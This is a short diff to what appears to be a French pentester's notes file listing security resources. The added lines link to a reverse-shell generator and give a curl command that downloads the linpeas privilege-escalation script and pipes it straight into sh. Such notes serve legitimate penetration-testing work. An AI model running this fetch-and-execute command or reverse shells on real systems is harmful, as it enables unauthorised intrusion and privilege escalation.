@@ -12,3 +12,6 @@ https://sansorg.egnyte.com/dl/bF4I3yCcnt/ : exemple de Rule of Engagement qui d�
 
 https://www.ncsc.gov.uk/collection/cyber-assessment-framework/caf-objective-a-managing-security-risk : Framework pour les pentests
 
+https://www.revshells.com/  : générer un reverse shell
+
+curl https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh : lancer linpeas sur une machine linux pour une recherche de privilege escalation
